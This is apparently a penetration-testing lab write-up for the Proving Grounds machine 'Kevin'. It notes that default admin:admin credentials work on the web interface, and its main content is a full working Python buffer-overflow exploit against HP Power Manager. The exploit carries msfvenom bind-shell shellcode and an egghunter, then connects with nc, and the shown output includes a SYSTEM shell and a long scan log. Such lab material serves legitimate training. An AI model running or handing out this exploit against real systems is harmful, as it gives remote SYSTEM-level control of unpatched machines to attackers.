# Kevin
So easy I didn't even have to Try Harder.

1. Guess that there's a web server port of 80, checks it (or nmap, either works)
2. HP Power Manager looks suspicious, finds an exploit and uses it to get a reverse shell.

# Enumeration
Can guess for a web server
## 80 - Web Server

![](Pasted%20image%2020220116220553.png)

Default credentials can be googled to be `admin`:`admin`


![](Pasted%20image%2020220116220533.png)


# Exploit



Final Exploit Code: Used a Bind Shell. Reverse shell payloads didn't work (likely due to firewall)
```
#!/usr/bin/python
print """
##//#############################################################################################################
##							##							#
## Vulnerability: HP Power Manager 'formExportDataLogs' ##  FormExportDataLogs Buffer Overflow	 		#
## 							##  HP Power Manager				 	#
## Vulnerable Application: HP Power Manager	 	##  This is a part of the Metasploit Module, 		#
## Tested on Windows [Version 6.1.7600] 		##  exploit/windows/http/hp_power_manager_filename	#
##							##							#
## Author: Muhammad Haidari				##  Spawns a shell to same window			#
## Contact: ghmh@outlook.com				##							#
## Website: www.github.com/muhammd			##							#
##							##							#
##//#############################################################################################################
##
##
## TODO: adjust 
##
## Usage: python hpm_exploit.py <Remote IP Address>
"""
import urllib
import os
import sys
import struct
import time
from socket import *

try:
   HOST  = sys.argv[1]
except IndexError:
   print "Usage: %s HOST" % sys.argv[0]
   sys.exit()

PORT  = 80

#msfvenom -p windows/shell_bind_tcp LHOST=10.11.0.55 LPORT=1234  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
# msfvenom -p windows/shell_bind_tcp LHOST=192.168.225.45 LPORT=1234  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.225 LPORT=443  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python

egg="b33fb33f"
buf= egg
buf += b"\x29\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\x93\x95\xd2\xbb\x83\xee\xfc\xe2\xf4\x6f\x7d"
buf += b"\x50\xbb\x93\x95\xb2\x32\x76\xa4\x12\xdf\x18\xc5\xe2"
buf += b"\x30\xc1\x99\x59\xe9\x87\x1e\xa0\x93\x9c\x22\x98\x9d"
buf += b"\xa2\x6a\x7e\x87\xf2\xe9\xd0\x97\xb3\x54\x1d\xb6\x92"
buf += b"\x52\x30\x49\xc1\xc2\x59\xe9\x83\x1e\x98\x87\x18\xd9"
buf += b"\xc3\xc3\x70\xdd\xd3\x6a\xc2\x1e\x8b\x9b\x92\x46\x59"
buf += b"\xf2\x8b\x76\xe8\xf2\x18\xa1\x59\xba\x45\xa4\x2d\x17"
buf += b"\x52\x5a\xdf\xba\x54\xad\x32\xce\x65\x96\xaf\x43\xa8"
buf += b"\xe8\xf6\xce\x77\xcd\x59\xe3\xb7\x94\x01\xdd\x18\x99"
buf += b"\x99\x30\xcb\x89\xd3\x68\x18\x91\x59\xba\x43\x1c\x96"
buf += b"\x9f\xb7\xce\x89\xda\xca\xcf\x83\x44\x73\xca\x8d\xe1"
buf += b"\x18\x87\x39\x36\xce\xfd\xe1\x89\x93\x95\xba\xcc\xe0"
buf += b"\xa7\x8d\xef\xfb\xd9\xa5\x9d\x94\x6a\x07\x03\x03\x94"
buf += b"\xd2\xbb\xba\x51\x86\xeb\xfb\xbc\x52\xd0\x93\x6a\x07"
buf += b"\xd1\x9b\xcc\x82\x59\x6e\xd5\x82\xfb\xc3\xfd\x38\xb4"
buf += b"\x4c\x75\x2d\x6e\x04\xfd\xd0\xbb\x97\x47\x5b\x5d\xf9"
buf += b"\x85\x84\xec\xfb\x57\x09\x8c\xf4\x6a\x07\xec\xfb\x22"
buf += b"\x3b\x83\x6c\x6a\x07\xec\xfb\xe1\x3e\x80\x72\x6a\x07"
buf += b"\xec\x04\xfd\xa7\xd5\xde\xf4\x2d\x6e\xfb\xf6\xbf\xdf"
buf += b"\x93\x1c\x31\xec\xc4\xc2\xe3\x4d\xf9\x87\x8b\xed\x71"
buf += b"\x68\xb4\x7c\xd7\xb1\xee\xba\x92\x18\x96\x9f\x83\x53"
buf += b"\xd2\xff\xc7\xc5\x84\xed\xc5\xd3\x84\xf5\xc5\xc3\x81"
buf += b"\xed\xfb\xec\x1e\x84\x15\x6a\x07\x32\x73\xdb\x84\xfd"
buf += b"\x6c\xa5\xba\xb3\x14\x88\xb2\x44\x46\x2e\x32\xa6\xb9"
buf += b"\x9f\xba\x1d\x06\x28\x4f\x44\x46\xa9\xd4\xc7\x99\x15"
buf += b"\x29\x5b\xe6\x90\x69\xfc\x80\xe7\xbd\xd1\x93\xc6\x2d"
buf += b"\x6e"



#tools/exploit/egghunter.rb -f python -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a' -e b33f -v 'hunter'

hunter =  ""
hunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
hunter += "\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x89\xd7"
hunter += "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

buffer = "\x41" * (721 -len(hunter))
buffer +="\x90"*30 + hunter
buffer +="\xeb\xc2\x90\x90"           #JMP SHORT 0xC2 
buffer += "\xd5\x74\x41" 	      #pop esi # pop ebx # ret 10 (DevManBE.exe)
 

content= "dataFormat=comma&exportto=file&fileName=%s" % urllib.quote_plus(buffer)
content+="&bMonth=03&bDay=12&bYear=2017&eMonth=03&eDay=12&eYear=2017&LogType=Application&actionType=1%253B"

payload =  "POST /goform/formExportDataLogs HTTP/1.1\r\n"
payload += "Host: %s\r\n" % HOST
payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
payload += "Accept: %s\r\n" % buf
payload += "Referer: http://%s/Contents/exportLogs.asp?logType=Application\r\n" % HOST
payload += "Content-Type: application/x-www-form-urlencoded\r\n"
payload += "Content-Length: %s\r\n\r\n" % len(content)
payload += content

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print "[+] Payload Fired... She will be back in less than a min..."
s.send(payload)
print "[+] Give me 30 Sec!"
time.sleep(30)
os.system("nc -nv " + HOST +" 1234")
s.close()
print "[+] Did you get your Proof.txt file?!?"
#note if you didn't get a bindshell, you may have to bump it to a minute time.sleep(60).


```

https://github.com/Muhammd/HP-Power-Manager/blob/master/hpm_exploit.py

```

┌──(kali㉿kali)-[/tmp]
└─$ wget https://raw.githubusercontent.com/Muhammd/HP-Power-Manager/master/hpm_exploit.py       
--2022-01-16 09:00:51--  https://raw.githubusercontent.com/Muhammd/HP-Power-Manager/master/hpm_exploit.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4492 (4.4K) [text/plain]
Saving to: ‘hpm_exploit.py’

hpm_exploit.py                            100%[=====================================================================================>]   4.39K  --.-KB/s    in 0s      

2022-01-16 09:00:51 (47.9 MB/s) - ‘hpm_exploit.py’ saved [4492/4492]

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ mousepad hpm_exploit.py       
              
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/shell_bind_tcp LHOST=192.168.225.45 LPORT=1234  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 352 (iteration=0)
x86/call4_dword_xor chosen with final size 352
Payload size: 352 bytes
Final size of python file: 1727 bytes
buf =  b""
buf += b"\x29\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\x93\x95\xd2\xbb\x83\xee\xfc\xe2\xf4\x6f\x7d"
buf += b"\x50\xbb\x93\x95\xb2\x32\x76\xa4\x12\xdf\x18\xc5\xe2"
buf += b"\x30\xc1\x99\x59\xe9\x87\x1e\xa0\x93\x9c\x22\x98\x9d"
buf += b"\xa2\x6a\x7e\x87\xf2\xe9\xd0\x97\xb3\x54\x1d\xb6\x92"
buf += b"\x52\x30\x49\xc1\xc2\x59\xe9\x83\x1e\x98\x87\x18\xd9"
buf += b"\xc3\xc3\x70\xdd\xd3\x6a\xc2\x1e\x8b\x9b\x92\x46\x59"
buf += b"\xf2\x8b\x76\xe8\xf2\x18\xa1\x59\xba\x45\xa4\x2d\x17"
buf += b"\x52\x5a\xdf\xba\x54\xad\x32\xce\x65\x96\xaf\x43\xa8"
buf += b"\xe8\xf6\xce\x77\xcd\x59\xe3\xb7\x94\x01\xdd\x18\x99"
buf += b"\x99\x30\xcb\x89\xd3\x68\x18\x91\x59\xba\x43\x1c\x96"
buf += b"\x9f\xb7\xce\x89\xda\xca\xcf\x83\x44\x73\xca\x8d\xe1"
buf += b"\x18\x87\x39\x36\xce\xfd\xe1\x89\x93\x95\xba\xcc\xe0"
buf += b"\xa7\x8d\xef\xfb\xd9\xa5\x9d\x94\x6a\x07\x03\x03\x94"
buf += b"\xd2\xbb\xba\x51\x86\xeb\xfb\xbc\x52\xd0\x93\x6a\x07"
buf += b"\xd1\x9b\xcc\x82\x59\x6e\xd5\x82\xfb\xc3\xfd\x38\xb4"
buf += b"\x4c\x75\x2d\x6e\x04\xfd\xd0\xbb\x97\x47\x5b\x5d\xf9"
buf += b"\x85\x84\xec\xfb\x57\x09\x8c\xf4\x6a\x07\xec\xfb\x22"
buf += b"\x3b\x83\x6c\x6a\x07\xec\xfb\xe1\x3e\x80\x72\x6a\x07"
buf += b"\xec\x04\xfd\xa7\xd5\xde\xf4\x2d\x6e\xfb\xf6\xbf\xdf"
buf += b"\x93\x1c\x31\xec\xc4\xc2\xe3\x4d\xf9\x87\x8b\xed\x71"
buf += b"\x68\xb4\x7c\xd7\xb1\xee\xba\x92\x18\x96\x9f\x83\x53"
buf += b"\xd2\xff\xc7\xc5\x84\xed\xc5\xd3\x84\xf5\xc5\xc3\x81"
buf += b"\xed\xfb\xec\x1e\x84\x15\x6a\x07\x32\x73\xdb\x84\xfd"
buf += b"\x6c\xa5\xba\xb3\x14\x88\xb2\x44\x46\x2e\x32\xa6\xb9"
buf += b"\x9f\xba\x1d\x06\x28\x4f\x44\x46\xa9\xd4\xc7\x99\x15"
buf += b"\x29\x5b\xe6\x90\x69\xfc\x80\xe7\xbd\xd1\x93\xc6\x2d"
buf += b"\x6e"
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python hpm_exploit.py                       

##//#############################################################################################################
##                                                      ##                                                      #
## Vulnerability: HP Power Manager 'formExportDataLogs' ##  FormExportDataLogs Buffer Overflow                  #
##                                                      ##  HP Power Manager                                    #
## Vulnerable Application: HP Power Manager             ##  This is a part of the Metasploit Module,            #
## Tested on Windows [Version 6.1.7600]                 ##  exploit/windows/http/hp_power_manager_filename      #
##                                                      ##                                                      #
## Author: Muhammad Haidari                             ##  Spawns a shell to same window                       #
## Contact: ghmh@outlook.com                            ##                                                      #
## Website: www.github.com/muhammd                      ##                                                      #
##                                                      ##                                                      #
##//#############################################################################################################
##
##
## TODO: adjust 
##
## Usage: python hpm_exploit.py <Remote IP Address>

Usage: hpm_exploit.py HOST
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python hpm_exploit.py 192.168.225.45

##//#############################################################################################################
##                                                      ##                                                      #
## Vulnerability: HP Power Manager 'formExportDataLogs' ##  FormExportDataLogs Buffer Overflow                  #
##                                                      ##  HP Power Manager                                    #
## Vulnerable Application: HP Power Manager             ##  This is a part of the Metasploit Module,            #
## Tested on Windows [Version 6.1.7600]                 ##  exploit/windows/http/hp_power_manager_filename      #
##                                                      ##                                                      #
## Author: Muhammad Haidari                             ##  Spawns a shell to same window                       #
## Contact: ghmh@outlook.com                            ##                                                      #
## Website: www.github.com/muhammd                      ##                                                      #
##                                                      ##                                                      #
##//#############################################################################################################
##
##
## TODO: adjust 
##
## Usage: python hpm_exploit.py <Remote IP Address>

[+] Payload Fired... She will be back in less than a min...
[+] Give me 30 Sec!
(UNKNOWN) [192.168.225.45] 1234 (?) open
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd \Users\Administrator
cd \Users\Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
03c37fa209b13f78386784f41a83a58e

C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 2:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::6105:3aa4:ddbf:48b2%15
   IPv4 Address. . . . . . . . . . . : 192.168.225.45
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.225.254

Tunnel adapter Reusable ISATAP Interface {AD5249E3-105D-452D-AF94-6E3E29548657}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Teredo Tunneling Pseudo-Interface:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

C:\Users\Administrator\Desktop>

```

![](Pasted%20image%2020220116220945.png)


# Others

```
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin]
└─$ sudo /home/kali/.local/bin/autorecon -vv 192.168.225.45 
[sudo] password for kali: 
[*] Scanning target 192.168.225.45
[*] Port scan Top TCP Ports (top-tcp-ports) running against 192.168.225.45
[*] Port scan Top TCP Ports (top-tcp-ports) is running the following command against 192.168.225.45: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/_quick_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/xml/_quick_tcp_nmap.xml" 192.168.225.45
[*] Port scan All TCP Ports (all-tcp-ports) running against 192.168.225.45
[*] Port scan All TCP Ports (all-tcp-ports) is running the following command against 192.168.225.45: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/xml/_full_tcp_nmap.xml" 192.168.225.45
[*] Port scan Top 100 UDP Ports (top-100-udp-ports) running against 192.168.225.45
[*] Port scan Top 100 UDP Ports (top-100-udp-ports) is running the following command against 192.168.225.45: nmap -vv --reason -Pn -T4 -sU -A --top-ports 100 -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/_top_100_udp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/xml/_top_100_udp_nmap.xml" 192.168.225.45
[*] Discovered open port tcp/135 on 192.168.225.45
[*] Discovered open port tcp/3389 on 192.168.225.45
[*] Discovered open port tcp/445 on 192.168.225.45
[*] Discovered open port tcp/80 on 192.168.225.45
[*] Discovered open port tcp/139 on 192.168.225.45
[*] 08:10:08 - There are 3 scans still running against 192.168.225.45: top-tcp-ports, all-tcp-ports, top-100-udp-ports
[*] Discovered open port tcp/49153 on 192.168.225.45
[*] Port scan Top TCP Ports (top-tcp-ports) against 192.168.225.45 finished in 1 minute, 54 seconds
[*] Identified service http on tcp/80 on 192.168.225.45
[*] Identified service msrpc on tcp/135 on 192.168.225.45
[*] Identified service netbios-ssn on tcp/139 on 192.168.225.45
[*] Identified service microsoft-ds on tcp/445 on 192.168.225.45
[!] [tcp/445/microsoft-ds/enum4linux against 192.168.225.45] Plugin should only be run once and it appears to have already been queued. Skipping.
[!] [tcp/445/microsoft-ds/nbtscan against 192.168.225.45] Plugin should only be run once and it appears to have already been queued. Skipping.
[!] [tcp/445/microsoft-ds/smbclient against 192.168.225.45] Plugin should only be run once and it appears to have already been queued. Skipping.
[*] Identified service tcpwrapped on tcp/3389 on 192.168.225.45
[!] [192.168.225.45] Service tcp/3389/tcpwrapped/insecure did not match any plugins based on the service name.
[*] Identified service msrpc on tcp/49152 on 192.168.225.45
[*] Identified service msrpc on tcp/49153 on 192.168.225.45
[*] Identified service msrpc on tcp/49154 on 192.168.225.45
[*] Identified service msrpc on tcp/49155 on 192.168.225.45
[*] Identified service msrpc on tcp/49156 on 192.168.225.45
[*] Identified service msrpc on tcp/49159 on 192.168.225.45
[*] Service scan Directory Buster (tcp/80/http/dirbuster) running against 192.168.225.45
[*] Service scan Directory Buster (tcp/80/http/dirbuster) is running the following command against 192.168.225.45: feroxbuster -u http://192.168.225.45:80/ -t 10 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -q -o "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp80/tcp_80_http_feroxbuster_common.txt"
[*] Service scan Curl (tcp/80/http/curl) running against 192.168.225.45
[*] Service scan Curl (tcp/80/http/curl) is running the following command against 192.168.225.45: curl -sSik http://192.168.225.45:80/
[*] Service scan Curl Robots (tcp/80/http/curl-robots) running against 192.168.225.45
[*] Service scan Curl Robots (tcp/80/http/curl-robots) is running the following command against 192.168.225.45: curl -sSikf http://192.168.225.45:80/robots.txt
[*] Service scan Nmap HTTP (tcp/80/http/nmap-http) running against 192.168.225.45
[*] Service scan Nmap HTTP (tcp/80/http/nmap-http) is running the following command against 192.168.225.45: nmap -vv --reason -Pn -T4 -sV -p 80 --script="banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp80/tcp_80_http_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp80/xml/tcp_80_http_nmap.xml" 192.168.225.45
[*] Service scan whatweb (tcp/80/http/whatweb) running against 192.168.225.45
[*] Service scan whatweb (tcp/80/http/whatweb) is running the following command against 192.168.225.45: whatweb --color=never --no-errors -a 3 -v http://192.168.225.45:80 2>&1
[*] Service scan wkhtmltoimage (tcp/80/http/wkhtmltoimage) running against 192.168.225.45
[*] Service scan wkhtmltoimage (tcp/80/http/wkhtmltoimage) is running the following command against 192.168.225.45: wkhtmltoimage --format png http://192.168.225.45:80/ /media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp80/tcp_80_http_screenshot.png
[*] Service scan Nmap MSRPC (tcp/135/msrpc/nmap-msrpc) running against 192.168.225.45
[*] Service scan Nmap MSRPC (tcp/135/msrpc/nmap-msrpc) is running the following command against 192.168.225.45: nmap -vv --reason -Pn -T4 -sV -p 135 --script="banner,msrpc-enum,rpc-grind,rpcinfo" -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp135/tcp_135_rpc_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp135/xml/tcp_135_rpc_nmap.xml" 192.168.225.45
[*] Service scan rpcdump (tcp/135/msrpc/rpcdump) running against 192.168.225.45
[*] Service scan rpcdump (tcp/135/msrpc/rpcdump) is running the following command against 192.168.225.45: impacket-rpcdump -port 135 192.168.225.45
[*] Service scan Enum4Linux (tcp/139/netbios-ssn/enum4linux) running against 192.168.225.45
[*] Service scan Enum4Linux (tcp/139/netbios-ssn/enum4linux) is running the following command against 192.168.225.45: enum4linux -a -M -l -d 192.168.225.45 2>&1
[*] Service scan nbtscan (tcp/139/netbios-ssn/nbtscan) running against 192.168.225.45
[*] Service scan nbtscan (tcp/139/netbios-ssn/nbtscan) is running the following command against 192.168.225.45: nbtscan -rvh 192.168.225.45 2>&1
[*] Service scan Nmap SMB (tcp/139/netbios-ssn/nmap-smb) running against 192.168.225.45
[*] Service scan Nmap SMB (tcp/139/netbios-ssn/nmap-smb) is running the following command against 192.168.225.45: nmap -vv --reason -Pn -T4 -sV -p 139 --script="banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp139/tcp_139_smb_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp139/xml/tcp_139_smb_nmap.xml" 192.168.225.45
[*] Service scan SMBClient (tcp/139/netbios-ssn/smbclient) running against 192.168.225.45
[*] Service scan SMBClient (tcp/139/netbios-ssn/smbclient) is running the following command against 192.168.225.45: smbclient -L\\ -N -I 192.168.225.45 2>&1
[*] Service scan SMBMap (tcp/139/netbios-ssn/smbmap) running against 192.168.225.45
[*] Service scan SMBMap (tcp/139/netbios-ssn/smbmap) is running the following command against 192.168.225.45: smbmap -H 192.168.225.45 -P 139 2>&1
[*] Service scan Nmap SMB (tcp/445/microsoft-ds/nmap-smb) running against 192.168.225.45
[*] Service scan Nmap SMB (tcp/445/microsoft-ds/nmap-smb) is running the following command against 192.168.225.45: nmap -vv --reason -Pn -T4 -sV -p 445 --script="banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp445/tcp_445_smb_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp445/xml/tcp_445_smb_nmap.xml" 192.168.225.45
[*] Service scan SMBMap (tcp/445/microsoft-ds/smbmap) running against 192.168.225.45
[*] Service scan SMBMap (tcp/445/microsoft-ds/smbmap) is running the following command against 192.168.225.45: smbmap -H 192.168.225.45 -P 445 2>&1
[*] Service scan Nmap MSRPC (tcp/49152/msrpc/nmap-msrpc) running against 192.168.225.45
[*] Service scan Nmap MSRPC (tcp/49152/msrpc/nmap-msrpc) is running the following command against 192.168.225.45: nmap -vv --reason -Pn -T4 -sV -p 49152 --script="banner,msrpc-enum,rpc-grind,rpcinfo" -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp49152/tcp_49152_rpc_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp49152/xml/tcp_49152_rpc_nmap.xml" 192.168.225.45
[*] Service scan rpcdump (tcp/49152/msrpc/rpcdump) running against 192.168.225.45
[*] Service scan rpcdump (tcp/49152/msrpc/rpcdump) is running the following command against 192.168.225.45: impacket-rpcdump -port 49152 192.168.225.45
[*] Service scan Nmap MSRPC (tcp/49153/msrpc/nmap-msrpc) running against 192.168.225.45
[*] Service scan Nmap MSRPC (tcp/49153/msrpc/nmap-msrpc) is running the following command against 192.168.225.45: nmap -vv --reason -Pn -T4 -sV -p 49153 --script="banner,msrpc-enum,rpc-grind,rpcinfo" -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp49153/tcp_49153_rpc_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp49153/xml/tcp_49153_rpc_nmap.xml" 192.168.225.45
[*] Service scan rpcdump (tcp/49153/msrpc/rpcdump) running against 192.168.225.45
[*] Service scan rpcdump (tcp/49153/msrpc/rpcdump) is running the following command against 192.168.225.45: impacket-rpcdump -port 49153 192.168.225.45
[*] Service scan Nmap MSRPC (tcp/49154/msrpc/nmap-msrpc) running against 192.168.225.45
[*] Service scan Nmap MSRPC (tcp/49154/msrpc/nmap-msrpc) is running the following command against 192.168.225.45: nmap -vv --reason -Pn -T4 -sV -p 49154 --script="banner,msrpc-enum,rpc-grind,rpcinfo" -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp49154/tcp_49154_rpc_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp49154/xml/tcp_49154_rpc_nmap.xml" 192.168.225.45
[*] Service scan rpcdump (tcp/49154/msrpc/rpcdump) running against 192.168.225.45
[*] Service scan rpcdump (tcp/49154/msrpc/rpcdump) is running the following command against 192.168.225.45: impacket-rpcdump -port 49154 192.168.225.45
[*] Service scan Nmap MSRPC (tcp/49155/msrpc/nmap-msrpc) running against 192.168.225.45
[*] Service scan Nmap MSRPC (tcp/49155/msrpc/nmap-msrpc) is running the following command against 192.168.225.45: nmap -vv --reason -Pn -T4 -sV -p 49155 --script="banner,msrpc-enum,rpc-grind,rpcinfo" -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp49155/tcp_49155_rpc_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp49155/xml/tcp_49155_rpc_nmap.xml" 192.168.225.45
[*] Service scan rpcdump (tcp/49155/msrpc/rpcdump) running against 192.168.225.45
[*] Service scan rpcdump (tcp/49155/msrpc/rpcdump) is running the following command against 192.168.225.45: impacket-rpcdump -port 49155 192.168.225.45
[*] Service scan Nmap MSRPC (tcp/49156/msrpc/nmap-msrpc) running against 192.168.225.45
[*] Service scan Nmap MSRPC (tcp/49156/msrpc/nmap-msrpc) is running the following command against 192.168.225.45: nmap -vv --reason -Pn -T4 -sV -p 49156 --script="banner,msrpc-enum,rpc-grind,rpcinfo" -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp49156/tcp_49156_rpc_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp49156/xml/tcp_49156_rpc_nmap.xml" 192.168.225.45
[*] Service scan rpcdump (tcp/49156/msrpc/rpcdump) running against 192.168.225.45
[*] Service scan rpcdump (tcp/49156/msrpc/rpcdump) is running the following command against 192.168.225.45: impacket-rpcdump -port 49156 192.168.225.45
[*] Service scan Nmap MSRPC (tcp/49159/msrpc/nmap-msrpc) running against 192.168.225.45
[*] Service scan Nmap MSRPC (tcp/49159/msrpc/nmap-msrpc) is running the following command against 192.168.225.45: nmap -vv --reason -Pn -T4 -sV -p 49159 --script="banner,msrpc-enum,rpc-grind,rpcinfo" -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp49159/tcp_49159_rpc_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp49159/xml/tcp_49159_rpc_nmap.xml" 192.168.225.45
[*] Service scan rpcdump (tcp/49159/msrpc/rpcdump) running against 192.168.225.45
[*] Service scan rpcdump (tcp/49159/msrpc/rpcdump) is running the following command against 192.168.225.45: impacket-rpcdump -port 49159 192.168.225.45
[*] Service scan Curl (tcp/80/http/curl) against 192.168.225.45 finished in 8 seconds
[*] Service scan nbtscan (tcp/139/netbios-ssn/nbtscan) against 192.168.225.45 finished in 7 seconds
